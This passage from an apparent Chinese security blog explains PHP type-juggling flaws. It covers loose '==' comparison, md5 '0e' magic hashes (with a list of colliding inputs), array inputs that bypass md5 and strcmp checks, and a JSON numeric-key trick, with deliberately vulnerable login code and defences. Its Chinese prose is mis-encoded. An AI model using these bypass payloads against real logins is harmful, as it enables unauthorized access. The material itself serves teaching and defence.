å¦‚æœæ¯”è¾ƒä¸€ä¸ªæ•°å­—å’Œå­—ç¬¦ä¸²æˆ–è€…æ¯”è¾ƒæ¶‰åŠåˆ°æ•°å­—å†…å®¹çš„å­—ç¬¦ä¸²ï¼Œåˆ™å­—ç¬¦ä¸²ä¼šè¢«è½¬æ¢ä¸ºæ•°å€¼å¹¶ä¸”æ¯”è¾ƒæŒ‰ç…§æ•°å€¼æ¥è¿›è¡Œã€‚æ­¤è§„åˆ™ä¹Ÿé€‚ç”¨äº switch è¯­å¥ã€‚å½“ç”¨ === æˆ– !== è¿›è¡Œæ¯”è¾ƒæ—¶åˆ™ä¸è¿›è¡Œç±»å‹è½¬æ¢ï¼Œå› ä¸ºæ­¤æ—¶ç±»å‹å’Œæ•°å€¼éƒ½è¦æ¯”å¯¹. &emsp;&emsp;æ˜ç¡®çš„å†™å‡ºäº†ï¼Œå¦‚æœä¸€ä¸ªæ•°å€¼å’Œä¸€ä¸ªå­—ç¬¦ä¸²æ¯”è¾ƒï¼Œé‚£ä¹ˆä¼šå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ•°å€¼ï¼ˆè€Œä¸æ˜¯ç›¸åï¼Œå°†æ•°å€¼è½¬åŒ–ä¸ºå­—ç¬¦ä¸²ï¼‰ &emsp;&emsp;ç„¶è€Œï¼Œphpæ˜¯å¦‚ä½•å°†ä¸€ä¸ªå­—ç¬¦ä¸²è½¬åŒ–ä¸ºæ•°å€¼çš„å‘¢ï¼Œæˆ‘ä»¬ç»§ç»­æŸ¥çœ‹phpæ‰‹å†Œ å½“ä¸€ä¸ªå­—ç¬¦ä¸²è¢«å½“ä½œä¸€ä¸ªæ•°å€¼æ¥å–å€¼ï¼Œå…¶ç»“æœå’Œç±»å‹å¦‚ä¸‹ï¼šå¦‚æœè¯¥å­—ç¬¦ä¸²æ²¡æœ‰åŒ…å« â€˜**.â€™ï¼Œâ€™eâ€™ æˆ– â€˜Eâ€™ å¹¶ä¸”å…¶æ•°å­—å€¼åœ¨æ•´å‹çš„èŒƒå›´ä¹‹å†…ï¼ˆç”± PHP_INT_MAX æ‰€å®šä¹‰ï¼‰ï¼Œè¯¥å­—ç¬¦ä¸²å°†è¢«å½“æˆ integer æ¥å–å€¼ã€‚å…¶å®ƒæ‰€æœ‰æƒ…å†µä¸‹éƒ½è¢«ä½œä¸º float æ¥å–å€¼ã€‚è¯¥å­—ç¬¦ä¸²çš„å¼€å§‹éƒ¨åˆ†å†³å®šäº†å®ƒçš„å€¼**ã€‚å¦‚æœè¯¥å­—ç¬¦ä¸²ä»¥åˆæ³•çš„æ•°å€¼å¼€å§‹ï¼Œåˆ™ä½¿ç”¨è¯¥æ•°å€¼ã€‚å¦åˆ™å…¶å€¼ä¸º 0ï¼ˆé›¶ï¼‰ã€‚åˆæ³•æ•°å€¼ç”±å¯é€‰çš„æ­£è´Ÿå·ï¼Œåé¢è·Ÿç€ä¸€ä¸ªæˆ–å¤šä¸ªæ•°å­—ï¼ˆå¯èƒ½æœ‰å°æ•°ç‚¹ï¼‰ï¼Œå†è·Ÿç€å¯é€‰çš„æŒ‡æ•°éƒ¨åˆ†ã€‚æŒ‡æ•°éƒ¨åˆ†ç”± â€˜eâ€™ æˆ– â€˜Eâ€™ åé¢è·Ÿç€ä¸€ä¸ªæˆ–å¤šä¸ªæ•°å­—æ„æˆã€‚ &emsp;&emsp;è¿™æ˜¯å®˜æ–¹æ‰‹å†Œä¸Šé¢çš„å‡ ä¸ªä¾‹å­ &lt;?php$foo = 1 + &quot;10.5&quot;; // $foo is float (11.5)$foo = 1 + &quot;-1.3e3&quot;; // $foo is float (-1299)$foo = 1 + &quot;bob-1.3e3&quot;; // $foo is integer (1)$foo = 1 + &quot;bob3&quot;; // $foo is integer (1)$foo = 1 + &quot;10 Small Pigs&quot;; // $foo is integer (11)$foo = 4 + &quot;10.2 Little Piggies&quot;; // $foo is float (14.2)$foo = &quot;10.0 pigs &quot; + 1; // $foo is float (11)$foo = &quot;10.0 pigs &quot; + 1.0; // $foo is float (11) ?&gt; æˆ‘ä»¬å¤§æ¦‚å¯ä»¥æ€»ç»“å‡ºå¦‚ä¸‹çš„è§„åˆ™ï¼šå½“ä¸€ä¸ªå­—ç¬¦ä¸²è¢«è½¬æ¢ä¸ºæ•°å€¼æ—¶ å¦‚æœä¸€ä¸ªå­—ç¬¦ä¸²ä¸º â€œåˆæ³•æ•°å­—+e+åˆæ³•æ•°å­—â€ç±»å‹ï¼Œå°†ä¼šè§£é‡Šä¸ºç§‘å­¦è®¡æ•°æ³•çš„æµ®ç‚¹æ•° å¦‚æœä¸€ä¸ªå­—ç¬¦ä¸²ä¸º â€œåˆæ³•æ•°å­—+ ä¸å¯è§£é‡Šä¸ºåˆæ³•æ•°å­—çš„å­—ç¬¦ä¸²â€ç±»å‹ï¼Œå°†ä¼šè¢«è½¬æ¢ä¸ºè¯¥åˆæ³•æ•°å­—çš„å€¼ï¼Œåé¢çš„å­—ç¬¦ä¸²å°†ä¼šè¢«ä¸¢å¼ƒ å¦‚æœä¸€ä¸ªå­—ç¬¦ä¸²ä¸ºâ€œä¸å¯è§£é‡Šä¸ºåˆæ³•æ•°å­—çš„å­—ç¬¦ä¸²+ä»»æ„â€ç±»å‹ï¼Œåˆ™è¢«è½¬æ¢ä¸º0ï¼ ä¸º0â€¦ä¸º0 &lt;?php&#x27;a&#x27;==0 // true&#x27;12a&#x27;==12 //true&#x27;1&#x27;==1 //true&#x27;1aaaa55sss66&#x27;==1 //true &emsp;&emsp;å½“ç„¶ï¼Œä¸Šé¢çš„é‚£äº›ç­‰å¼å¯¹äº===éƒ½æ˜¯falseçš„ï¼ŒåŸæœ¬ä¸€äº›åº”è¯¥ç”¨===çš„åœ°æ–¹è¯¯ç”¨äº†==ï¼Œå¯¼è‡´äº†å¯ä»¥æ³¨å…¥çš„åœ°æ–¹ã€‚ 2ã€ç¤ºä¾‹ä»£ç 1ï¼šåˆ©ç”¨è½¬ä¸ºæ•°å­—åç›¸ç­‰çš„æ¼æ´&lt;?php if (isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;])) &#123; $logined = true; $v1 = $_GET[&#x27;v1&#x27;]; $v2 = $_GET[&#x27;v2&#x27;]; if (!ctype_alpha($v1)) &#123;$logined = false;&#125; //ctype_alphaå‡½æ•°æ£€æŸ¥æä¾›çš„å­—ç¬¦ä¸²ï¼Œæ–‡æœ¬ä¸­çš„æ‰€æœ‰å­—ç¬¦æ˜¯å¦éƒ½æ˜¯å­—æ¯ï¼Œæ˜¯åˆ™è¿”å›Trueï¼Œå¦åˆ™è¿”å›Falseï¼Œå› æ­¤è¿™é‡Œè¦å…¨æ˜¯å­—æ¯ if (!is_numeric($v2) ) &#123;$logined = false;&#125; //å¦‚æœæŒ‡å®šçš„å˜é‡æ˜¯æ•°å­—å’Œæ•°å­—å­—ç¬¦ä¸²åˆ™è¿”å› TRUEï¼Œå¦åˆ™è¿”å› FALSEï¼Œå› æ­¤å¿…é¡»åŒ…å«ä¸”åªèƒ½åŒ…å«æ•°å­—/æ•°å­—å­—ç¬¦ä¸² if (md5($v1) != md5($v2)) &#123;$logined = false;&#125;//å¦‚æœmd5å€¼ä¸ç›¸ç­‰ï¼Œåˆ™è¿”å›Trueï¼Œå› æ­¤è¿™é‡Œè¦è¿”å›ç›¸ç­‰çš„md5 if ($logined)&#123; // continuue to do other things &#125; else &#123; echo &quot;login failed&quot; &#125; &#125;? &emsp;&emsp;è¿™æ˜¯ä¸€ä¸ªCTFçš„é¢˜ç›®ï¼Œéå¸¸æœ‰è¶£ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œè¦æ±‚ç»™å‡ºä¸¤å­—ç¬¦ä¸²ï¼Œä¸€ä¸ªæ˜¯çº¯æ•°å­—å‹ï¼Œä¸€ä¸ªåªèƒ½å‡ºç°å­—ç¬¦ï¼Œä½¿ä¸¤ä¸ªçš„md5å“ˆå¸Œå€¼ç›¸ç­‰ï¼Œç„¶è€Œè¿™ç§å¼ºç¢°æ’åœ¨å¯†ç å­¦ä¸Šéƒ½æ˜¯æ— æ³•åšåˆ°çš„ã€‚ä½†æ˜¯æˆ‘ä»¬çœ‹åˆ°ï¼Œæœ€ç»ˆæ¯”è¾ƒä¸¤è€…çš„å“ˆå¸Œçš„æ—¶å€™ï¼Œä½¿ç”¨çš„æ˜¯ç­‰äº è€Œä¸æ˜¯ å…¨ç­‰äº ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨ä¸€ä¸‹è¿™ä¸ªæ¼æ´ &emsp;&emsp;å†å›å¤´çœ‹ä¸€ md5()å‡½æ•° string md5 ( string $str [, bool $raw_output = false ] ) &emsp;&emsp;å¯ä»¥çŸ¥é“ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºtrueçš„æ—¶å€™ï¼Œæ˜¾ç¤º16ä½çš„ç»“æœï¼Œè€Œä¸ºfalseå’Œæ²¡æœ‰ç¬¬äºŒä¸ªå‚æ•°æ—¶ï¼Œä¸º32ä½çš„16è¿›åˆ¶ç ï¼ˆ16ä½çš„ç»“æœæ˜¯æŠŠ32ä½çš„ä½œä¸ºASCIIç è¿›è¡Œè§£æï¼‰ &emsp;&emsp;16è¿›åˆ¶çš„æ•°æ®ä¸­æ˜¯å«æœ‰eçš„ï¼Œå¯ä»¥æ„å»ºä½¿å¾—ä¸¤ä¸ªæ•°å­—æ¯”è¾ƒçš„ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªç°æˆçš„ä¾‹å­ï¼š md5(&#x27;240610708&#x27;) //0e462097431906509019562988736854.md5(&#x27;QNKCDZO&#x27;) //0e830400451993494058024219903391 &emsp;&emsp;å¯ä»¥çœ‹åˆ°ï¼Œè¿™ä¸¤ä¸ªå­—ç¬¦ä¸²ä¸€ä¸ªåªåŒ…å«æ•°å­—ï¼Œä¸€ä¸ªåªåŒ…å«å­—æ¯ï¼Œè™½ç„¶ä¸¤ä¸ªçš„å“ˆå¸Œä¸ä¸€æ ·ï¼Œä½†æ˜¯éƒ½æ˜¯ä¸€ä¸ªå½¢å¼ï¼š0e çº¯æ•°å­—è¿™ç§æ ¼å¼çš„å­—ç¬¦ä¸²åœ¨åˆ¤æ–­ç›¸ç­‰çš„æ—¶å€™ä¼šè¢«è®¤ä¸ºæ˜¯ç§‘å­¦è®¡æ•°æ³•çš„æ•°å­—ï¼Œå…ˆåšå­—ç¬¦ä¸²åˆ°æ•°å­—çš„è½¬æ¢ã€‚ &emsp;&emsp;è½¬æ¢åéƒ½æˆä¸ºäº†0çš„å¥½å¤šå¥½å¤šæ¬¡æ–¹ï¼Œéƒ½æ˜¯0ï¼Œç›¸ç­‰ã€‚ï¼ˆå¤§å®¶å¯ä»¥è‡ªå·±å°è¯•ä¸€ä¸‹ï¼‰å› æ­¤ md5(&#x27;240610708&#x27;)==md5(&#x27;QNKCDZO&#x27;); //Truemd5(&#x27;240610708&#x27;)===md5(&#x27;QNKCDZO&#x27;); //False ç”¨===å¯ä»¥é¿å…è¿™ä¸€æ¼æ´ã€‚ 3ã€ç¤ºä¾‹ä»£ç 2: åˆ©ç”¨ ç±»â€™aâ€™==0çš„æ¼æ´&lt;?php if (isset($_POST[&#x27;json&#x27;])) &#123; $json = json_decode($_POST[&#x27;json&#x27;]); $key =&quot;**********************&quot;; if ($json-&gt;key == $key) &#123; //login success ,continue &#125; else &#123; //login failed ï¼Œreturn &#125;?&gt; &emsp;&emsp;è¿™æ¬¡è¿™ä¸ªä¾‹å­æ˜¯ä¼ å…¥ä¸€ä¸ªJSONçš„æ•°æ®ï¼ŒJSONåœ¨RESTfulçš„ç½‘ç«™ä¸­æ˜¯å¾ˆå¸¸ç”¨çš„ä¸€ç§æ•°æ®ä¼ è¾“çš„æ ¼å¼ã€‚è¿™ä¸ªè¡¨å•ä¼šæŠŠä¸€ä¸ªnameä¸ºkeyçš„inputçš„æ•°æ®ä½œä¸ºjsonä¼ åˆ°æœåŠ¡ç«¯ &#123;&quot;key&quot;:&quot;your input&quot;&#125; &emsp;&emsp;æˆ‘ä»¬è¯¥å¦‚ä½•ç ´è§£ï¼Ÿæƒ³â€aâ€==0è¿™ä¸ªæ¼æ´ï¼Œä¹‹ç”¨æˆ‘ä»¬ä½¿$json-&gt;keyæ˜¯ä¸€ä¸ªæ•°å­—ç±»å‹çš„å˜é‡å°±å¯ä»¥ï¼Œæ€ä¹ˆåšåˆ°å‘¢ï¼Ÿ &emsp;&emsp;phpçš„json_decode()å‡½æ•°ä¼šæ ¹æ®jsonæ•°æ®ä¸­çš„æ•°æ®ç±»å‹æ¥å°†å…¶è½¬æ¢ä¸ºphpä¸­çš„ç›¸åº”ç±»å‹çš„æ•°æ®ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæˆ‘ä»¬åœ¨jsonä¸­ä¼ ä¸€ä¸ªstringç±»å‹ï¼Œé‚£ä¹ˆè¯¥å˜é‡å°±æ˜¯stringï¼Œå¦‚æœä¼ å…¥çš„æ˜¯numberï¼Œåˆ™è¯¥å˜é‡ä¸ºnumberã€‚å› æ­¤ï¼Œæˆ‘ä»¬å¦‚æœä¼ å…¥ä¸€ä¸ªæ•°å­—ï¼Œå°±å¯ä»¥ä½¿ä¹‹ç›¸ç­‰ã€‚ç½‘é¡µä¸­çš„è¡¨å•å¯èƒ½é™åˆ¶äº†æ‰€æœ‰çš„è¾“å…¥éƒ½æ˜¯stringï¼Œå³ä½¿è¾“å…¥æ•°å­—ï¼Œä¼ å…¥çš„ä¸œè¥¿ä¹Ÿæ˜¯ &#123;&quot;key&quot;:&quot;0&quot;&#125; &emsp;&emsp;è¿™æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²0ï¼Œæˆ‘ä»¬éœ€è¦è®©ä»–ä¸ºæ•°å­—ç±»å‹ï¼Œç”¨burpæ‹¦æˆªï¼ŒæŠŠä¸¤ä¸ªåŒå¼•å·å»æ‰ï¼Œå˜æˆè¿™æ ·å³å¯ï¼š &#123;&quot;key&quot;:0&#125; &emsp;&emsp;å€¼å¾—è®¨è®ºçš„ä¸€ç‚¹æ˜¯ï¼Œåœ¨è¿™ç§æ–¹æ³•çš„æ¼æ´åˆ©ç”¨ä¸­ï¼Œå¾ˆéš¾åœ¨ç›´æ¥è¡¨å•ç±»å‹çš„POSTçš„æ•°æ®ä¸­ä½¿ç”¨ï¼Œè¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Œè¿™ä¸ªå’ŒHTTPåè®®æœ‰å…³ã€‚é¦–å…ˆï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹ï¼Œåœ¨POSTç»™æœåŠ¡å™¨çš„æ•°æ®ä¸­ï¼Œæœ‰å‡ ç§ç±»å‹ï¼Œä¹Ÿå°±æ˜¯HTTP headerä¸­çš„Content-Typeï¼š application/x-www-form-urlencodedmultipart/form-dataapplication/jsonapplication/xml &emsp;&emsp;ç¬¬ä¸€ä¸ªapplication/x-www-form-urlencodedï¼Œæ˜¯ä¸€èˆ¬è¡¨å•å½¢å¼æäº¤çš„ã€‚content-typeç¬¬äºŒä¸ªï¼Œæ˜¯åŒ…å«æ–‡ä»¶çš„è¡¨å•ã€‚ç¬¬ä¸‰ï¼Œå››ä¸ªï¼Œåˆ†åˆ«æ˜¯jsonå’Œxmlï¼Œä¸€èˆ¬æ˜¯jså½“ä¸­ä¸Šä¼ çš„ &emsp;&emsp;ä½†æ˜¯å› ä¸ºåœ¨ç›´æ¥çš„POSTçš„payloadå½“ä¸­æ˜¯æ— æ³•åŒºåˆ†å­—ç¬¦ä¸²å’Œæ•°å­—çš„ï¼Œå› ä¸ºåœ¨å…¶ä¸­å¹¶æ²¡æœ‰å¼•å·å‡ºç°ï¼Œä¸¾ä¸€ä¸ªæŠ“åŒ…çš„ä¾‹å­ POST /login HTTP/1.1Host: xxx.comContent-Length: 41Accept: application/json, text/javascript,application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.59 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Connection: closeusername=admin&amp;password=admin &emsp;&emsp;å¯ä»¥çœ‹åˆ°ï¼Œpayloadæ˜¯æ”¾åœ¨httpåŒ…çš„æœ€åé¢çš„ï¼Œè€Œä¸”éƒ½æ˜¯ä»¥æ²¡æœ‰å¼•å·çš„å½¢å¼ä¼ é€’çš„ï¼Œå¹¶æ²¡æœ‰åŠæ³•åŒºåˆ†åˆ°åº•æ˜¯å­—ç¬¦ä¸²è¿˜æ˜¯æ•°å­—ã€‚å› æ­¤ï¼ŒPHPå°†POSTçš„æ•°æ®å…¨éƒ¨ä¿å­˜ä¸ºå­—ç¬¦ä¸²å½¢å¼ï¼Œä¹Ÿå°±æ²¡æœ‰åŠæ³•æ³¨å…¥æ•°å­—ç±»å‹çš„æ•°æ®äº†ã€‚è€ŒJSONåˆ™ä¸ä¸€æ ·ï¼ŒJSONæœ¬èº«æ˜¯ä¸€ä¸ªå®Œæ•´çš„å­—ç¬¦ä¸²ï¼Œç»è¿‡è§£æä¹‹åå¯èƒ½æœ‰å­—ç¬¦ä¸²ï¼Œæ•°å­—ï¼Œå¸ƒå°”ç­‰å¤šç§ç±»å‹ã€‚ äºŒã€md5()æ¼æ´1ã€æ•°ç»„ç»•è¿‡&emsp;&emsp;md5()å‡½æ•°æ— æ³•å¤„ç†æ•°ç»„ï¼Œå¦‚æœä¼ å…¥çš„ä¸ºæ•°ç»„ï¼Œä¼šè¿”å›NULLï¼Œæ‰€ä»¥ä¸¤ä¸ªæ•°ç»„ç»è¿‡åŠ å¯†åå¾—åˆ°çš„éƒ½æ˜¯NULLï¼Œä¹Ÿå°±æ˜¯ç›¸ç­‰çš„ã€‚ 2ã€åˆ©ç”¨==æ¼æ´ç»•è¿‡&emsp;&emsp;åˆ©ç”¨==æ¯”è¾ƒæ¼æ´ï¼šå¦‚æœä¸¤ä¸ªå­—ç¬¦ç»MD5åŠ å¯†åçš„å€¼ä¸º 0exxxxxå½¢å¼ï¼Œå°±ä¼šè¢«è®¤ä¸ºæ˜¯ç§‘å­¦è®¡æ•°æ³•ï¼Œä¸”è¡¨ç¤ºçš„æ˜¯0*10çš„xxxxæ¬¡æ–¹ï¼Œè¿˜æ˜¯é›¶ï¼Œéƒ½æ˜¯ç›¸ç­‰çš„ &emsp;&emsp;ä¸‹åˆ—çš„å­—ç¬¦ä¸²çš„MD5å€¼éƒ½æ˜¯0eå¼€å¤´çš„ï¼š QNKCDZO240610708s878926199as155964671as214587387as214587387a0eå¼€å¤´çš„md5å’ŒåŸå€¼ï¼šs878926199a0e545993274517709034328855841020s155964671a0e342768416822451524974117254469s214587387a0e848240448830537924465865611904s214587387a0e848240448830537924465865611904s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s1885207154a0e509367213418206700842008763514s1502113478a0e861580163291561247404381396064s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s155964671a0e342768416822451524974117254469s1184209335a0e072485820392773389523109082030s1665632922a0e731198061491163073197128363787s1502113478a0e861580163291561247404381396064s1836677006a0e481036490867661113260034900752s1091221200a0e940624217856561557816327384675s155964671a0e342768416822451524974117254469s1502113478a0e861580163291561247404381396064s155964671a0e342768416822451524974117254469s1665632922a0e731198061491163073197128363787s155964671a0e342768416822451524974117254469s1091221200a0e940624217856561557816327384675s1836677006a0e481036490867661113260034900752s1885207154a0e509367213418206700842008763514s532378020a0e220463095855511507588041205815s878926199a0e545993274517709034328855841020s1091221200a0e940624217856561557816327384675s214587387a0e848240448830537924465865611904s1502113478a0e861580163291561247404381396064s1091221200a0e940624217856561557816327384675s1665632922a0e731198061491163073197128363787s1885207154a0e509367213418206700842008763514s1836677006a0e481036490867661113260034900752s1665632922a0e731198061491163073197128363787s878926199a0e545993274517709034328855841020 ä¸‰ã€strcmpæ¼æ´æ³¨ï¼šè¿™ä¸€ä¸ªæ¼æ´é€‚ç”¨ä¸5.3ä¹‹å‰ç‰ˆæœ¬çš„php &emsp;&emsp;æˆ‘ä»¬é¦–å…ˆçœ‹ä¸€ä¸‹è¿™ä¸ªå‡½æ•°,è¿™ä¸ªå‡½æ•°æ˜¯ç”¨äºæ¯”è¾ƒå­—ç¬¦ä¸²çš„å‡½æ•° int strcmp ( string $str1 , string $str2 ) &emsp;&emsp;å‚æ•° str1ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚str2ç¬¬äºŒä¸ªå­—ç¬¦ä¸²ã€‚å¦‚æœ str1 å°äº str2 è¿”å› &lt; 0ï¼› å¦‚æœ str1 å¤§äº str2 è¿”å› &gt; 0ï¼›å¦‚æœä¸¤è€…ç›¸ç­‰ï¼Œè¿”å› 0ã€‚ &emsp;&emsp;å¯çŸ¥ï¼Œä¼ å…¥çš„æœŸæœ›ç±»å‹æ˜¯å­—ç¬¦ä¸²ç±»å‹çš„æ•°æ®ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬ä¼ å…¥éå­—ç¬¦ä¸²ç±»å‹çš„æ•°æ®çš„æ—¶å€™ï¼Œè¿™ä¸ªå‡½æ•°å°†ä¼šæœ‰æ€ä¹ˆæ ·çš„è¡Œä¸ºå‘¢ï¼Ÿå®é™…ä¸Šï¼Œå½“è¿™ä¸ªå‡½æ•°æ¥å—åˆ°äº†ä¸ç¬¦åˆçš„ç±»å‹ï¼Œè¿™ä¸ªå‡½æ•°å°†å‘ç”Ÿé”™è¯¯ï¼Œä½†æ˜¯åœ¨5.3ä¹‹å‰çš„phpä¸­ï¼Œæ˜¾ç¤ºäº†æŠ¥é”™çš„è­¦å‘Šä¿¡æ¯åï¼Œå°†return 0 !!!! ä¹Ÿå°±æ˜¯è™½ç„¶æŠ¥äº†é”™ï¼Œä½†å´åˆ¤å®šå…¶ç›¸ç­‰äº†ã€‚è¿™å¯¹äºä½¿ç”¨è¿™ä¸ªå‡½æ•°æ¥åšé€‰æ‹©è¯­å¥ä¸­çš„åˆ¤æ–­çš„ä»£ç æ¥è¯´ç®€ç›´æ˜¯ä¸€ä¸ªè‡´å‘½çš„æ¼æ´ï¼Œå½“ç„¶ï¼Œphpå®˜æ–¹åœ¨åé¢çš„ç‰ˆæœ¬ä¸­ä¿®å¤äº†è¿™ä¸ªæ¼æ´ï¼Œä½¿å¾—æŠ¥é”™çš„æ—¶å€™å‡½æ•°ä¸è¿”å›ä»»ä½•å€¼ã€‚ä½†æ˜¯æˆ‘ä»¬ä»ç„¶å¯ä»¥ä½¿ç”¨è¿™ä¸ªæ¼æ´å¯¹ä½¿ç”¨è€ç‰ˆæœ¬phpçš„ç½‘ç«™è¿›è¡Œæ¸—é€æµ‹è¯•ã€‚çœ‹ä¸€æ®µç¤ºä¾‹ä»£ç ï¼š &lt;?php $password=&quot;***************&quot; if(isset($_POST[&#x27;password&#x27;]))&#123; if (strcmp($_POST[&#x27;password&#x27;], $password) == 0) &#123; echo &quot;Right!!!login success&quot;;n exit(); &#125; else &#123; echo &quot;Wrong password..&quot;; &#125;?&gt; &emsp;&emsp;å¯¹äºè¿™æ®µä»£ç ï¼Œæˆ‘ä»¬èƒ½ç”¨ä»€ä¹ˆåŠæ³•ç»•è¿‡éªŒè¯å‘¢ï¼Œ åªè¦æˆ‘ä»¬$_POST[â€˜passwordâ€™]æ˜¯ä¸€ä¸ªæ•°ç»„æˆ–è€…ä¸€ä¸ªobjectå³å¯ï¼Œä½†æ˜¯ä¸Šä¸€ä¸ªé—®é¢˜çš„æ—¶å€™è¯´åˆ°è¿‡ï¼Œåªèƒ½ä¸Šä¼ å­—ç¬¦ä¸²ç±»å‹ï¼Œé‚£æˆ‘ä»¬åˆè¯¥å¦‚ä½•åšå‘¢ã€‚ &emsp;&emsp;å…¶å®phpä¸ºäº†å¯ä»¥ä¸Šä¼ ä¸€ä¸ªæ•°ç»„ï¼Œä¼šæŠŠç»“å°¾å¸¦ä¸€å¯¹ä¸­æ‹¬å·çš„å˜é‡ï¼Œä¾‹å¦‚ xxx[]çš„nameï¼ˆå°±æ˜¯$_POSTä¸­çš„keyï¼‰ï¼Œå½“ä½œä¸€ä¸ªåå­—ä¸ºxxxçš„æ•°ç»„æ„é€ ç±»ä¼¼å¦‚ä¸‹çš„request POST /login HTTP/1.1Host: xxx.comContent-Length: 41Accept: application/json, text/javascriptUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.59 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Connection: closepassword[]=admin &emsp;&emsp;å³å¯ä½¿å¾—ä¸Šè¿°ä»£ç ç»•è¿‡éªŒè¯æˆåŠŸã€‚ å››ã€æ€»ç»“&emsp;&emsp;è¿™ä¸€ç±»å‹çš„æ¼æ´çš„ç‰¹ç‚¹ä¸»è¦å°±æ˜¯åˆ©ç”¨PHPä¸­ çš„ç±»å‹ç‰¹æ€§æ¥ç»•è¿‡éªŒè¯ã€‚ç”±äº == å’Œ === æœ‰ç€æ˜æ˜¾çš„åŒºåˆ†ï¼Œå› æ­¤ï¼Œä¼°è®¡çŸ­æœŸå†…PHPçš„ä½œè€…å¹¶ä¸ä¼šè°ƒæ•´å¯¹äºè¿™ä¸¤ä¸ªç¬¦å·çš„ç­–ç•¥ã€‚è€Œå¯¹äºå¼€å‘å¸‚åœºè€Œè¨€ï¼Œéšç€åŸ¹è®­æœºæ„çš„å¢å¤šï¼Œåç«¯ç¨‹åºå‘˜å°¤å…¶æ˜¯phpåç«¯ç¨‹åºå‘˜çš„é—¨æ§›è¶Šæ¥è¶Šä½ï¼Œå…¶æ°´å¹³å¿…å®šä¹Ÿæ˜¯è‰¯è ä¸é½ï¼Œè¿™äº›äºŒæŠŠåˆ€ç¨‹åºå‘˜å¯èƒ½å¸¦æ¥æ›´å¤šçš„æ­¤ç±»å¯¹äºç‰¹æ€§çš„ä¸å½“ä½¿ç”¨å¯¼è‡´çš„æ¼æ´ï¼Œå› æ­¤è¿™ç±»æ¼æ´ä»ç„¶æ˜¯éå¸¸å…·æœ‰åˆ©ç”¨ä»·å€¼çš„ã€‚ &emsp;&emsp;è®°ä½ä¿è¯å®‰å…¨çš„å‡ å¥ç®´è¨€ï¼šä»»ä½•ç”¨æˆ·è¾“å…¥éƒ½æ˜¯ä¸å¯ä¿¡çš„ï¼å¯¹äºwebåº”ç”¨æ¥è¯´ï¼Œå‰ç«¯ï¼ˆæµè§ˆå™¨ç«¯ï¼‰çš„å®‰å…¨é™åˆ¶åªèƒ½èµ·åˆ°é˜²æ­¢ä¸€èˆ¬ç”¨æˆ·çš„è¯¯è¾“å…¥è¡Œä¸ºï¼Œå®Œå…¨ä¸å¯èƒ½å¯¹äºé»‘å¸½å­çš„è¡Œä¸ºæœ‰ä»»ä½•çš„é˜²å¾¡ä½œç”¨ &emsp;&emsp;å› æ­¤ï¼Œåœ¨é˜²å¾¡è¿™ä¸ªæ¼æ´çš„è¿‡ç¨‹ä¸­ï¼Œä¿è¯å‡ ä»¶äº‹æƒ…ï¼š åœ¨æ‰€æœ‰å¯èƒ½çš„åœ°æ–¹ï¼Œéƒ½ä½¿ç”¨===æ¥ä»£æ›¿== å¯¹äºç”¨æˆ·è¾“å…¥åšè¿‡æ»¤å’Œç±»å‹æ£€æŸ¥ å°½é‡ä½¿ç”¨æ–°ç‰ˆæœ¬çš„phpï¼Œapache åŸºæœ¬ä¸Šå°±å¯ä»¥å®Œç¾çš„é˜²å¾¡è¿™ä¸€ç±»çš„æ¼æ´ã€‚ &emsp;&emsp;è€Œå¯¹äºæ¸—é€æµ‹è¯•äººå‘˜ï¼Œåœ¨ä»£ç å®¡è®¡çš„è¿‡ç¨‹ä¸­ï¼Œå¯¹äºæœ‰==ï¼Œstrcmpçš„æ¯”è¾ƒä¹Ÿåº”æä¸ºæ•æ„Ÿ ã€‚åœ¨é»‘ç›’æ¸—é€çš„æ—¶å€™ä¹Ÿå¯ä»¥å¯¹äºä»£ç è¿›è¡ŒçŒœæµ‹ï¼Œç»“åˆä¿¡æ¯æœé›†è¿‡ç¨‹ä¸­çš„ä¸€äº›ç‰ˆæœ¬ç‰¹æ€§ï¼Œåˆ©ç”¨è¿™äº›æ¼æ´æ¥ç»•è¿‡éªŒè¯ã€‚","categories":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://wolke.cn/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://wolke.cn/tags/Web%E5%AE%89%E5%85%A8/"},{"name":"PHP","slug":"PHP","permalink":"https://wolke.cn/tags/PHP/"}],"author":"w01ke"},{"title":"PHPçš„$GLOBALSæ•°ç»„","slug":"PHPçš„$GLOBALSæ•°ç»„","date":"2021-12-12T14:04:04.000Z","updated":"2021-12-12T16:38:34.184Z","comments":true,"path":"post/b7832a6b.html","link":"","permalink":"https://wolke.cn/post/b7832a6b.html","excerpt":"","text":"$GLOBALS â€”â€” å¼•ç”¨å…¨å±€ä½œç”¨åŸŸä¸­å¯ç”¨çš„å…¨éƒ¨å˜é‡ã€‚ è¯´æ˜ï¼šä¸€ä¸ªåŒ…å«äº†å…¨éƒ¨å˜é‡çš„å…¨å±€ç»„åˆæ•°ç»„ã€‚å˜é‡çš„åå­—å°±æ˜¯æ•°ç»„çš„é”®ã€‚ ç¤ºä¾‹ï¼š #ç¤ºä¾‹ä»£ç &lt;?phpfunction 